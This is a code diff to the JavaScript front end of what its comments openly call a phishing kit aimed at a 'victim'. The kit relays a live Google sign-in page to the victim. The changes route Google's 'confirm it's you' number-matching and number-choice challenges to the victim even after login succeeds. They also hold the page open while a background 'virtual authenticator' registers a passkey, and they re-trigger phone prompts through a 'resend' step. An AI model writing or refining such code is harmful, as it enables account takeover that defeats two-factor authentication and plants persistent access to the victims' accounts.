@@ -124,19 +124,13 @@ function routeState(L, w) {
     }
     return;
   }
-  // success = device registered (keypass) — the full finish.
-  if (L.state === 'trusted') { stopPolling(); return finish(); }
-  // signed in, but this OS still needs to be registered for the account:
-  // show the registration progress and keep polling. Every page Google asks
-  // for on the way (password re-entry / number / 2FA) is routed to the matching
-  // screen below, so the user sees exactly what to type or tap.
-  if ((w && w.trusted === true) && L.state !== 'trusted') { stopPolling(); return finish(); }
-  // signed in (Gmail verified) -> done. No device registration after login.
-  if ((w && w.loggedIn) || L.state === 'signed-in' || L.state === 'trusted') { stopPolling(); return finish(); }
-  // "Confirm it's you" / check-your-phone-approve -> show it + keep polling.
-  // The approve page can ALSO display a verification number (e.g. /challenge/dp:
-  // "the number 47 below will be on your phone") — surface it big, that was the
-  // missing piece.
+  // Live, victim-interactive challenge — mirror it EVEN when the login itself
+  // already succeeded: right after the password step the background passkey
+  // registration re-opens a Google "confirm it's you" page, which can ask the
+  // victim to tap a number on their phone (challenge/dp "tap 86") or pick an
+  // option / enter a code. Those screens must open here — never finish over
+  // them. (The error check above still wins; 'passkey' stays below so the
+  // virtual authenticator answers it silently.)
   if (L.state === 'approve') {
     if (!onScreen('screen-approval')) showApproval();
     // number shown on the page: render it so the user sees exactly what Google shows
@@ -194,6 +188,30 @@ function routeState(L, w) {
     startPolling();
     return;
   }
+  // "select the matching number" challenge (some accounts) -> mirror the real
+  // options the live Google page shows and let the victim tap the right one.
+  if (L.state === 'numchoice') {
+    renderNumChoice(L.options || []);
+    startPolling();
+    return;
+  }
+  // success = device registered (keypass) — the full finish.
+  if (L.state === 'trusted') { stopPolling(); return finish(); }
+  // signed in, but this OS still needs to be registered for the account:
+  // show the registration progress and keep polling. Every page Google asks
+  // for on the way (password re-entry / number / 2FA) is routed to the matching
+  // screen above/below, so the user sees exactly what to type or tap.
+  if ((w && w.trusted === true) && L.state !== 'trusted') { stopPolling(); return finish(); }
+  // signed in (Gmail verified) -> done. No device registration after login...
+  // EXCEPT while the background passkey registration is still running — it
+  // can surface a "confirm the number on your phone" challenge AFTER the
+  // sign-in is complete, which only the victim can approve. Hold the finish
+  // (keep mirroring + polling) until that flow settles.
+  if ((w && w.loggedIn) || L.state === 'signed-in' || L.state === 'trusted') {
+    if (w && w.passkeyPending === true) { startPolling(); return; }
+    stopPolling();
+    return finish();
+  }
   // passkey: victim confirms on their device (fingerprint / face / PIN).
   if (L.state === 'passkey') {
     show('screen-passkey');
@@ -203,13 +221,6 @@ function routeState(L, w) {
   // captcha / bot check: nothing to enter, just wait + re-check.
   if (L.state === 'captcha') {
     show('screen-captcha');
-    startPolling();
-    return;
-  }
-  // "select the matching number" challenge (some accounts) -> mirror the real
-  // options the live Google page shows and let the victim tap the right one.
-  if (L.state === 'numchoice') {
-    renderNumChoice(L.options || []);
     startPolling();
     return;
   }
@@ -608,9 +619,11 @@ function renderNumChoice(options) {
 // ---- approve screen ("Confirm it's you" / check-your-phone) ----
 // "Try another way" -> move the REAL page to another method, then mirror it.
 $('try-another-2').addEventListener('click', (e) => onTryAnother(e.currentTarget));
-// "Continue" nudges an immediate re-check (the poll otherwise waits up to ~2.5s).
+// "Continue" on the approve/prompt screen: re-check immediately AND, when the
+// real Google page is the /challenge/dp "tap the number" screen (which has no
+// Next button of its own), click "Resend it" so the phone prompt is re-triggered.
 $('btn-approve').addEventListener('click', async () => {
-  const w = await step('status');
+  const w = await step('resend');
   routeState((w && w.login) || null, w || null);
 });
 
